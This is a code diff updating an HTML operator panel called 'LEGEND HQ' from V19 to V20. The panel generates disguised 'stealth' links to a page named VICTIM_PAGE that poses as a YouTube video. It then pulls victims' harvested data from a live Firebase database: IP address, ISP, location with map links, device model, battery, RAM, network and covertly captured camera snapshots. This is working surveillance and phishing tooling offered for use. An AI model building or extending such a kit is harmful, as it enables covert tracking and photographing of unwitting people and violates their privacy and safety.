@@ -3,94 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LEGEND HQ | V19 PRO</title>
+    <title>LEGEND HQ V20</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
-        body { background: #f4f7f6; font-family: 'Poppins', sans-serif; margin: 0; padding: 15px; color: #333; }
-        .container { max-width: 500px; margin: auto; }
-        .card { background: white; padding: 25px; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); margin-bottom: 15px; }
-        h1 { color: #cc0000; font-size: 1.2rem; text-align: center; margin-top: 0; }
-        input { width: 100%; padding: 12px; border: 1px solid #eee; border-radius: 12px; margin-bottom: 10px; box-sizing: border-box; outline: none; background: #fafafa; }
-        .btn { width: 100%; padding: 12px; border: none; border-radius: 12px; background: #00a884; color: white; font-weight: bold; cursor: pointer; margin-bottom: 8px; font-size: 14px; transition: 0.3s; }
-        .btn:active { transform: scale(0.97); }
-        .log-card { background: white; padding: 15px; border-radius: 20px; margin-top: 10px; border-left: 6px solid #cc0000; font-size: 0.8rem; box-shadow: 0 4px 15px rgba(0,0,0,0.03); }
-        .snap-img { width: 100%; border-radius: 12px; margin-top: 10px; border: 1px solid #eee; }
-        .badge { background: #f0f2f5; padding: 4px 10px; border-radius: 8px; display: inline-block; margin: 3px; font-weight: 600; font-size: 11px; }
-        .link-box { background: #e8f5f2; color: #00a884; padding: 12px; border-radius: 12px; font-size: 0.75rem; word-break: break-all; margin-top: 10px; display: none; text-align: center; border: 1px dashed #00a884; }
+        body { background: #e0e5ec; font-family: 'Segoe UI', sans-serif; padding: 20px; color: #444; }
+        .card { background: #e0e5ec; padding: 25px; border-radius: 30px; box-shadow: 20px 20px 60px #bec3c9, -20px -20px 60px #ffffff; margin-bottom: 20px; text-align: center; }
+        h1 { color: #00a884; letter-spacing: 2px; font-size: 1.5rem; margin-bottom: 20px; }
+        input { width: 100%; padding: 15px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: inset 6px 6px 12px #bec3c9, inset -6px -6px 12px #ffffff; margin-bottom: 15px; outline: none; box-sizing: border-box; }
+        .btn-gen { width: 100%; padding: 15px; border: none; border-radius: 15px; background: #00a884; color: white; font-weight: bold; box-shadow: 6px 6px 12px #bec3c9, -6px -6px 12px #ffffff; cursor: pointer; margin-bottom: 10px; }
+        .log-card { background: #e0e5ec; padding: 15px; border-radius: 20px; box-shadow: 6px 6px 12px #bec3c9, -6px -6px 12px #ffffff; margin-top: 15px; font-size: 0.75rem; border-left: 8px solid #00a884; text-align: left; }
+        .badge { background: #d1d9e6; padding: 4px 8px; border-radius: 8px; display: inline-block; margin: 2px; font-weight: bold; }
+        .snap-img { width: 100%; border-radius: 15px; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="card">
-            <h1>LEGEND HQ V19 PRO</h1>
-            <input type="text" id="masterKey" placeholder="Enter Secret Key">
-            <input type="text" id="targetUrl" placeholder="Video Link (YouTube)">
-            <button class="btn" onclick="generateLink()">GENERATE & COPY LINK</button>
-            <div id="linkArea" class="link-box" onclick="copyText()"></div>
-        </div>
-
-        <div style="display: flex; gap: 8px;">
-            <button class="btn" style="background:#333;" onclick="fetchData('tracking')">DETAILS</button>
-            <button class="btn" style="background:#cc0000;" onclick="fetchData('photos')">SNAPS</button>
-            <button class="btn" style="background:#007bff;" onclick="clearAll()">DELETE</button>
-        </div>
-
-        <div id="displayArea"></div>
+    <div class="card">
+        <h1>LEGEND HQ V20</h1>
+        <input type="text" id="k" placeholder="Secret Key (e.g. user1)">
+        <input type="text" id="r" placeholder="Target URL (e.g. YouTube)">
+        <button class="btn-gen" onclick="gen()">GENERATE STEALTH LINK</button>
+        <div id="out" onclick="copy()" style="font-size: 0.7rem; color: #00a884; cursor: pointer; margin-top: 10px; word-break: break-all;"></div>
     </div>
 
-    <script>
-        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/";
-        const VICTIM_PAGE = "https://video-obtg.vercel.app/"; // Change this to your URL
+    <div style="display: flex; gap: 10px;">
+        <button class="btn-gen" style="background:#333;" onclick="show('tracking')">LOCATIONS</button>
+        <button class="btn-gen" style="background:#cc0000;" onclick="show('photos')">SNAPS</button>
+    </div>
 
-        async function generateLink() {
-            const k = document.getElementById('masterKey').value;
-            const r = document.getElementById('targetUrl').value;
-            if(!k || !r) return alert("Keys and URL are required!");
-            const longLink = `${VICTIM_PAGE}?id=${btoa(JSON.stringify({k, r}))}`;
-            try {
-                const res = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longLink)}`);
-                const short = await res.text();
-                const area = document.getElementById('linkArea');
-                area.innerText = short;
-                area.style.display = 'block';
-                navigator.clipboard.writeText(short);
-                alert("Link Copied!");
-            } catch(e) { alert("Error generating short link."); }
+    <div id="logs"></div>
+
+    <script>
+        const DB = "https://location-5d435-default-rtdb.firebaseio.com/";
+        const PAGE = "https://video-obtg.vercel.app/"; // Naya Vercel URL yahan likhein
+
+        function gen() {
+            const k = document.getElementById('k').value, r = document.getElementById('r').value;
+            if(!k || !r) return alert("Fill all!");
+            const link = `${PAGE}#${btoa(JSON.stringify({k, r}))}`;
+            document.getElementById('out').innerText = link;
+            navigator.clipboard.writeText(link);
+            alert("Link Copied!");
         }
 
-        async function fetchData(path) {
-            const key = document.getElementById('masterKey').value;
-            const res = await fetch(`${DB_URL}${path}/${key}.json`);
+        async function show(path) {
+            const k = document.getElementById('k').value;
+            const res = await fetch(`${DB}${path}/${k}.json`);
             const data = await res.json();
-            const area = document.getElementById('displayArea');
-            area.innerHTML = "";
-            if(!data) return area.innerHTML = "<p style='text-align:center;'>No Data.</p>";
+            const area = document.getElementById('logs'); area.innerHTML = "";
+            if(!data) return;
 
             Object.keys(data).reverse().forEach(id => {
                 const item = data[id];
                 if(path === 'photos') {
-                    area.innerHTML += `<div class="log-card"><b>🕒 ${item.time}</b><img src="${item.photo}" class="snap-img"></div>`;
+                    area.innerHTML += `<div class="log-card" style="text-align:center;"><b>🕒 ${item.t}</b><img src="${item.p}" class="snap-img"></div>`;
                 } else {
                     area.innerHTML += `<div class="log-card">
                         <b>🕒 ${item.time}</b><br>
                         <span class="badge">🌐 IP: ${item.ip}</span> <img src="${item.flag}" width="18"><br>
                         <span class="badge">📡 ISP: ${item.isp}</span><br>
-                        <span class="badge">📍 ${item.loc}</span><br>
-                        <span class="badge">📱 ${item.model}</span> <span class="badge">🔋 ${item.battery}</span><br>
-                        <span class="badge">📶 Net: ${item.network}</span><br>
-                        <a href="${item.map}" target="_blank" style="color:#cc0000; font-weight:bold; text-decoration:none; display:block; margin-top:10px;">📍 OPEN IN GOOGLE MAPS</a>
+                        <span class="badge">🔋 Bat: ${item.bat}</span> <span class="badge">🧠 RAM: ${item.ram}GB</span><br>
+                        <span class="badge">📱 ${item.model}</span> <span class="badge">📶 ${item.net}</span><br>
+                        <a href="${item.map}" target="_blank" style="color:#00a884; font-weight:bold; text-decoration:none;">[ VIEW ON MAP ]</a>
                     </div>`;
                 }
             });
-        }
-
-        async function clearAll() {
-            const key = document.getElementById('masterKey').value;
-            if(!key || !confirm("Delete all data?")) return;
-            await fetch(`${DB_URL}tracking/${key}.json`, { method: 'DELETE' });
-            await fetch(`${DB_URL}photos/${key}.json`, { method: 'DELETE' });
-            alert("Data Cleared!");
-            document.getElementById('displayArea').innerHTML = "";
         }
     </script>
 </body>
